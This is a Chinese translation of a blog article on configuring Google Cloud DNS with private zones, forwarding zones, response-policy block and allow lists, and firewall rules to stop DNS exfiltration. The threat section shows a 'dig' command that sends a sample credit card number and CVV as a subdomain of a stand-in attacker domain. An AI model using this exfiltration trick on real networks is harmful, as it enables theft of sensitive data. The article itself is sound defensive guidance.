<html>
<head>
<title>Protecting from DNS exfiltration in GCP</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">在GCP防范DNS泄漏</h1>
<blockquote>原文：<a href="https://medium.com/google-cloud/protecting-from-dns-exfiltration-in-gcp-3c85d597d6ef?source=collection_archive---------0-----------------------#2022-02-12">https://medium.com/google-cloud/protecting-from-dns-exfiltration-in-gcp-3c85d597d6ef?source=collection_archive---------0-----------------------#2022-02-12</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/dd93d7758b5f0cd62ae39a5b6c5bab28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JAu4Eo0vpXkBnEyq4oOyHw.png"/></div></div></figure><p id="f030" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">DNS是每个网络中必不可少的系统，它不仅是互联网的电话簿，也是私有网络的电话簿。但是DNS也可以用作数据泄露的途径。我将展示如何在GCP配置云DNS来帮助抵御这些威胁。</p><h1 id="5605" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">DNS安全背景</h1><p id="ba69" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">DNS的基本操作很容易理解。你查询某项服务的IP，域名服务器会为你解析。例如，您可以查询“www.google.com”的IP地址:</p><pre class="ks kt ku kv fd kw kx ky kz aw la bi"><span id="9485" class="lb jq hi kx b fi lc ld l le lf">$ dig +short <a class="ae lg" href="http://www.google.com" rel="noopener ugc nofollow" target="_blank">www.google.com</a><br/>142.250.185.4</span></pre><p id="5011" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">想象一下，我是一名流氓员工，坐在一个网络中，可以访问信用卡信息等敏感数据。我想将其渗透到我自己的服务器上，但通常公司会使用防火墙来阻止与未知网站的连接，或者使用DLP解决方案来防止关键信息的渗透，或者使用其他安全解决方案。然而，我不需要自己连接到我的服务器。由于DNS流量通常是允许的，我可以使用DNS作为我的出口向量。让我们看看怎么做。</p><p id="23e2" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">我可以用查询日志为“evil-site.com”运行我自己的名称服务器。从网络内部的系统运行:</p><pre class="ks kt ku kv fd kw kx ky kz aw la bi"><span id="90d7" class="lb jq hi kx b fi lc ld l le lf">$ dig <strong class="kx hj">cc</strong>4917484589897107<strong class="kx hj">cvv</strong>123.evil-site.com</span></pre><p id="9cd1" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">通过DNS查询，我不是直接连接到我的服务器，而是由我公司的DNS解析器来完成，而是发送我想要的信息。注意，当然子域不会存在，我不关心答案，我把一个<strong class="is hj"> c </strong> redit <strong class="is hj"> c </strong> ard号和它的<strong class="is hj"> CVV </strong>泄露到我的服务器上！</p><blockquote class="lh li lj"><p id="d0b2" class="iq ir jo is b it iu iv iw ix iy iz ja lk jc jd je ll jg jh ji lm jk jl jm jn hb bi translated">网站“[www。]evil-site.com确实存在，但我并不拥有它。这似乎只是一个有趣的演示网站(去访问它:)。我决定使用它，因为它非常方便测试真正解决DNS查询，还因为它的名字很吸引人。</p></blockquote><p id="4336" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">显然，这是一个简单的例子，实际的方法更加复杂，DNS不仅可以用于泄漏数据，还可以作为一种隧道机制，一种下载恶意软件或接受来自<em class="jo">命令&amp;控制</em> (C2)服务器的命令的隐蔽通道。</p><p id="186f" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">有商业解决方案能够检测和阻止这些威胁，提供不同的功能，如机器学习技术来检测DNS查询中的数据。然而，成本可能不适合所有的预算。幸运的是，并不总是需要实施高级机制来防范DNS威胁。使用阻止列表和允许域列表来控制您的查询流量是常见的做法，我将展示如何使用云DNS来做到这一点。</p><h1 id="79d7" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">云DNS操作</h1><p id="aace" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">云DNS通常用于解析部署在GCP的私有DNS区域，但它也解析公共区域。评估顺序如下:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es ln"><img src="../Images/0081401c0aa8dcdbda439c3745d7ae62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K-YKTLTTgpjYQvywVw6C6A.png"/></div></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">云DNS解析顺序</figcaption></figure><p id="4c9d" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">这显示了解析顺序的摘要，但是如果您不熟悉<a class="ae lg" href="https://cloud.google.com/dns/docs/zones/zones-overview" rel="noopener ugc nofollow" target="_blank">云DNS </a>，我鼓励您在继续阅读之前先阅读它是如何工作的。您将需要它来理解以下部分。</p><blockquote class="lh li lj"><p id="a527" class="iq ir jo is b it iu iv iw ix iy iz ja lk jc jd je ll jg jh ji lm jk jl jm jn hb bi translated">我将不再讨论出站服务器策略，因为它有效地禁用了云DNS，并且很少使用。</p></blockquote><p id="1a2a" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">一个音符。我将使用云DNS配置阻止和允许列表，但是如果客户指向另一个解析器，如谷歌的DNS 8.8.8.8，他们将逃脱我们的控制。因此，应用GCP防火墙规则来阻止UDP和TCP<em class="jo">端口53上的所有传出DNS流量是很重要的！这不会影响云DNS，并将使它成为唯一可用的解析器。</em></p><h1 id="18bb" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">道路封闭</h1><p id="2db0" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">有几种方法可以创建阻止列表来阻止不需要的DNS查询。</p><h2 id="340b" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">使用私有区域来阻止</h2><p id="c41e" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">让我们配置第一个阻止列表。这将是非常简单的，我想阻止只有一个域名，“邪恶网站. com”。就像为它创建一个私有区域一样简单。除了自动创建的NS和SOA记录之外，它将为空:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mf"><img src="../Images/052e046ab904f1dcf31210b32e6bc5aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:822/0*qSpb3z_f3128LBAl"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">阻止带有私有区域的站点</figcaption></figure><p id="80da" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">现在，对“evil-site.com”或其子域名的任何查询都将在这个区域得到回答。特别是，如果我像以前一样尝试泄漏数据，它将不会从内部网络中传出:</p><pre class="ks kt ku kv fd kw kx ky kz aw la bi"><span id="1aa6" class="lb jq hi kx b fi lc ld l le lf">$ dig cc4917484589897107cvv123.evil-site.com<br/>...<br/>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 41420</span></pre><h2 id="f77b" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">使用转发区域来阻止</h2><p id="a7b2" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">如果您想部署自己的服务器来处理可疑的查询，您可以创建一个转发区域，并将所有这些查询转发给它。假设您的内部名称服务器正在侦听10.132.0.250:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mg"><img src="../Images/e37f0943ac1b905a91fa2ba236f01805.png" data-original-src="https://miro.medium.com/v2/resize:fit:1030/format:webp/1*K_Hmh5G5JJZzXeNNT-kljg.png"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">阻止带有转发区域的站点</figcaption></figure><p id="f649" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">这样，正常的DNS流量将由云DNS高效处理，您只需担心不需要的查询，这应该是例外。</p><p id="29fa" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">如果服务器只记录有问题的查询供SIEM稍后分析，我不建议您采用这种方法。您可以启用云DNS日志记录，这将为您提供更多信息，否则您可能会丢失这些信息，比如发送查询的虚拟机。例如，对于之前的私有区域，查看您将获得的信息:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mh"><img src="../Images/3fd160a63896cda18557643204e0bff7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1014/format:webp/1*ogx4MXxyAaBr-bHpX6vSuw.png"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">云日志中DNS查询的日志</figcaption></figure><p id="6a02" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">你可以识别诸如查询、发送查询的机器(<em class="jo">内幕</em>)、它的源IP或者它所在的项目。如果愿意，您可以通过Pub/Sub将这些日志发送到SIEM，或者通过Webhooks或Slack通道触发基于日志的警报。有多种选择。</p><h2 id="fc6b" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">使用响应策略规则阻止</h2><p id="b9a7" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">我们可以用私有或转发区域阻止不需要的DNS流量，只需为每个坏域创建一个区域。使用响应策略，机制更简单，您将得到看起来更像(阻止)列表的东西。</p><p id="c41c" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">GCP没有实现完整的<a class="ae lg" href="https://datatracker.ietf.org/doc/html/draft-vixie-dnsop-dns-rpz" rel="noopener ugc nofollow" target="_blank"> RPZ规范</a>。基本上，响应策略包含以DNS名称为关键字的规则。如果符合规则，它们可能会修改查询结果，或者允许查询失败。这次，我将创建一个包含两个域的阻止列表，让我向您展示一下它的样子:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mi"><img src="../Images/4cf9380f6edaff0314802d8e4b68cf71.png" data-original-src="https://miro.medium.com/v2/resize:fit:898/format:webp/1*pEioyCw0hlqfblmMqulawQ.png"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">带有响应策略规则的阻止列表</figcaption></figure><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mj"><img src="../Images/3706e281fa41faf400ce251e2cf9177b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1186/0*4N-YgiyB3hiImmUL"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">响应策略规则的详细信息</figcaption></figure><p id="349a" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">我为每个区域添加了规则(以及带有“* .”的子域))CNAME唱片公司瞄准了一个黑洞，并给它分配了一个假IP。一个A记录不能满足所有可能的查询类型，但是有了CNAME，我涵盖了所有的可能性。</p><p id="dec1" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">没有必要创建黑洞记录来使查询失败，例如，您可以将它指向蜜罐服务器，以最终从攻击者那里捕获更多信息。</p><h1 id="27df" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">抱歉，你不在名单上</h1><p id="f237" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">有时创建允许列表比阻止列表更方便。假设您希望只允许访问某些网站，如供应商的软件更新系统或您的容器注册表，并阻止其他所有内容。我们来看看怎么做。</p><h2 id="6854" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">使用专用和转发区域来允许</h2><p id="1ec6" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">首先，我将创建一个专用区域来阻止所有指定“.”的访问，根域:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mk"><img src="../Images/f88fab522a0f3c0ea228eea5ab235f95.png" data-original-src="https://miro.medium.com/v2/resize:fit:804/0*JC_hkfQxpBlhV6fw"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">用私有区域阻止所有DNS</figcaption></figure><p id="663b" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">现在，我将为我希望允许的站点添加指向外部解析器的转发区域:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es ml"><img src="../Images/c2d64951fc6a41f643f7b7d012f5cd9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1020/format:webp/1*S44akC9XOkaoiWDVsPDeeA.png"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">允许访问特定站点</figcaption></figure><p id="b53c" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">“gcr.io”的DNS查询将与此区域匹配，因为它比根域更具体(最长后缀匹配)。记得我提到过你应该通过防火墙规则阻止对其他解析器的访问，这仍然有效。这里，连接到8.8.8.8的不是虚拟机，而是云DNS。</p><h2 id="d5e5" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">使用响应策略规则来允许</h2><p id="b788" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">同样，对于响应策略，您会得到更类似于列表的东西。以下带有响应策略规则的配置可以做到这一点:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mm"><img src="../Images/8c048f0d1d38e42f465ccddb934dffcd.png" data-original-src="https://miro.medium.com/v2/resize:fit:926/format:webp/1*5aIntCnp0dM2SB_44PxMWQ.png"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">带有响应策略规则的允许列表</figcaption></figure><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es mn"><img src="../Images/07983cbc06a597309f235f71f674f087.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/0*OeuFU6KM_XareAj5"/></div><figcaption class="lo lp et er es lq lr bd b be z dx translated">响应策略规则的详细信息</figcaption></figure><p id="27dd" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">在黑名单的例子中，我创建了一个黑洞，其他规则通过CNAME指向它。有一个通配符规则来捕捉所有域，但是因为我为“gcr.io”域(允许的站点)添加了一个绕过规则，所以现在通配符不适用于“*.gcr.io”和“*”。io域。因此，至少对' * '有一个规则。需要“io”。</p><h1 id="1f72" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">问题的变体</h1><p id="90ed" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">我确信现在你可以自己创造一些我所提出的解决方案的变体。例如，使用转发区域阻止对互联网的所有访问，或者为多项目部署增加对等区域的使用。但是我将描述一些不太明显的方面。</p><h2 id="f2b9" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">谷歌API</h2><p id="31d9" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">大多数GCP服务，如云日志、BigQuery或Pub/Sub运行在“googleapis.com”的子域中，阻止它们可能会破坏GCP。这些API是公开的，所以如果你的安全策略阻止了互联网，你可以用CNAME重定向到“private . Google API . com ”,这样就可以对大多数谷歌API和其他服务进行内部访问。点击这里你可以找到更多信息。</p><h2 id="9e06" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">查询的来源</h2><p id="691f" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">如果您对发起查询的虚拟机感兴趣，以便您可以进一步调查发生了什么，您可以从云DNS日志中获得它。然而，如果您想要的是根据发送请求的客户端修改DNS解析，那就没那么容易了。</p><ul class=""><li id="9041" class="mo mp hi is b it iu ix iy jb mq jf mr jj ms jn mt mu mv mw bi translated">云DNS的粒度是网络，因此网络中的所有虚拟机(或与之对等的DNS)将获得相同的分辨率。</li><li id="d358" class="mo mp hi is b it mx ix my jb mz jf na jj nb jn mt mu mv mw bi translated">如果您将查询转发到您自己的名称服务器，它会将云DNS视为源(范围为35.199.192.0/19的IP。)，而不是VM。</li><li id="01a9" class="mo mp hi is b it mx ix my jb mz jf na jj nb jn mt mu mv mw bi translated">我们不在响应策略中实现“<a class="ae lg" href="https://tools.ietf.org/id/draft-vixie-dnsop-dns-rpz-00.html#client-ip-trigger" rel="noopener ugc nofollow" target="_blank">客户端IP地址</a>”RPZ触发器。</li><li id="e48d" class="mo mp hi is b it mx ix my jb mz jf na jj nb jn mt mu mv mw bi translated">我们没有在云DNS中实现<a class="ae lg" href="https://datatracker.ietf.org/doc/html/rfc7871" rel="noopener ugc nofollow" target="_blank"> EDNS客户端子网</a> (ECS)选项。</li></ul><p id="6b68" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">实施RPZ触发器将允许保持对云DNS的控制。相反，使用ECS，客户的名称服务器可以实施这种控制。嗯，云在不断进化，让我们拭目以待；)</p><h2 id="daa1" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">多，点</h2><p id="7991" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">HTTPS上的DNS(<a class="ae lg" href="https://datatracker.ietf.org/doc/html/rfc8484" rel="noopener ugc nofollow" target="_blank">DoH</a>或TLS ( <a class="ae lg" href="https://datatracker.ietf.org/doc/html/rfc7858" rel="noopener ugc nofollow" target="_blank"> DoT </a>)是在加密通道上执行DNS解析的两种协议。这意味着你也需要担心他们。</p><p id="3da6" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">两种协议都使用TLS，但有所不同。DoT通过TCP端口853使用TLS。这意味着如果您愿意，可以直接阻止它。但是，DoH在端口443上使用广泛使用的HTTPS协议，因此它看起来像其他HTTPS流量。让我们看一个例子:</p><pre class="ks kt ku kv fd kw kx ky kz aw la bi"><span id="6cf7" class="lb jq hi kx b fi lc ld l le lf">$ curl '<a class="ae lg" href="https://dns.google.com/resolve?name=example.com&amp;type=A'" rel="noopener ugc nofollow" target="_blank">https://dns.google.com/resolve?name=example.com&amp;type=A'</a><br/>{"Status":0,"TC":false,"RD":true,"RA":true,"AD":true,"CD":false,"Question":[{"name":"example.com.","type":1}],"Answer":[{"name":"example.com.","type":1,"TTL":20661,"data":"93.184.216.34"}]}</span></pre><p id="b8e2" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">请注意，在这种情况下，阻止DNS解析(例如“dns.google.com ”)并不能解决问题。渗透不会发生在这一步，攻击者可以简单地依靠服务的IP(如8.8.8.8)来启动HTTPS连接，看起来像正常的web流量。所以基本上这就把一个DNS安全问题转化成了一个web安全问题。假设您已经在保护web流量，您应该将这一点结合到您的检测逻辑中。</p><h2 id="7ca1" class="lb jq hi bd jr ls lt lu jv lv lw lx jz jb ly lz kd jf ma mb kh jj mc md kl me bi translated">饲料</h2><p id="6926" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">管理的区域、记录和规则都可以通过API创建。从一个域文本文件直接输入云域名系统，并保持每隔几分钟更新一次，这将是非常方便的。然而，没有内置的机制来馈送DNS。这将是一个有趣的特性。</p><h1 id="6362" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">结论</h1><p id="d693" class="pw-post-body-paragraph iq ir hi is b it kn iv iw ix ko iz ja jb kp jd je jf kq jh ji jj kr jl jm jn hb bi translated">DNS渗透技术对组织来说是真正的威胁。通过上述方法，您可以开始在GCP使用云DNS来帮助抵御这些威胁并改善您的安全状况。</p></div></div>    
</body>
</html>